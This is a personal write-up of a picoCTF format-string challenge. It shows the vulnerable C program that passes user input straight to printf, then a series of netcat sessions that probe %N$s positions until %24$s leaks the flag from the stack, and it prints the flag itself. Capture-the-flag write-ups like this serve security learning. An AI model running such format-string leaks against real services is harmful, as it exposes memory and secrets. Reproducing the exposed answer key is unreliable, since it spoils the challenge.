***Flag:*** <br>
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
<br>
***Approaching the challenge:*** <br>
Source code:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
The datatype used in the code was fishy since the string I am inputting was stored in the variable *story* in the form of ``` %127s```. <br>
The hint said format strings, so with this hint I used AI and it explain how a ``` format string specifer``` is used in this ``` %-number-$s```. <br>
The number indicates the position in which the flag may be there since, they're stored as a **stack*** and not as a simple string variable. <br>
After multiples such tries:
```
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %1$s
Here's a story -
%1$s
w
^[[A^[[A^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %2$s
Here's a story -
$�
ok
^[[A^[[A^[[A^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> $3%s
Here's a story -
$3$3%s
^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %10%s
Here's a story -
%s
nc saturn.picoctf.net 51310^[[A
^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %10$s
Here's a story -
(null)
^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %15$s
Here's a story -
�������
^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %20$s
Here's a story -
�a*�
^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %25$s
Here's a story -
�*��
^[[A^C
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %30$s
Here's a story -
̓ii
```
Finally got it in the 24th stack:
```
root@Advait:~# nc saturn.picoctf.net 51310
Tell me a story and then I'll tell you one >> %24$s
Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
<br>
Hence when the input is stored in such a format string, we use **%number$s** to find out which stack has the flag or desired output. It basically replicates
**%p %p %p %p %p ...... %s** <br>
The "%p" prints the memory address from the stack and the %s converts is to a string to print.
